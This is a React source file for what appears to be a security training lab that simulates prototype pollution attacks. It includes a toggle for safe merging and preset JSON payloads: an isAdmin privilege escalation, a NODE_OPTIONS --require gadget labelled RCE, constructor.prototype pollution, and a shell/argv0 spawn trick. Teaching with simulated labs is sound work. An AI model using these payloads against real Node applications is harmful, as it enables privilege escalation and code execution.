import { GenericLab } from './GenericLab'
import { simulateProtoPollution } from '../../utils/simulators/protoPollutionSimulator'
import { useI18n } from '../../i18n'

export function ProtoPollutionLab() {
  const { locale } = useI18n()
  const isRu = locale === 'ru'
  return (
    <GenericLab
      config={{
        vulnType: 'Prototype Pollution',
        defaultPayload: '{"name":"researcher","__proto__":{"isAdmin":true}}',
        payloadLabel: isRu ? 'JSON-payload' : 'JSON payload',
        defaultScenario: { safeMerge: false },
        scenarioControls: [
          { type: 'toggle', key: 'safeMerge', label: isRu ? 'безопасный merge' : 'safe merge' }
        ],
        presets: [
          { id: 'admin', title: '__proto__.isAdmin=true', payload: '{"name":"researcher","__proto__":{"isAdmin":true}}' },
          { id: 'shell', title: 'env.NODE_OPTIONS RCE', payload: '{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/payload.js"}}}' },
          { id: 'ctor', title: 'constructor.prototype', payload: '{"constructor":{"prototype":{"polluted":true}}}' },
          { id: 'spawn', title: 'shell+argv0 trick', payload: '{"__proto__":{"shell":"/bin/sh","argv0":"-c"}}' }
        ],
        simulate: (payload, scenario, loc) => simulateProtoPollution(payload, scenario, loc)
      }}
    />
  )
}
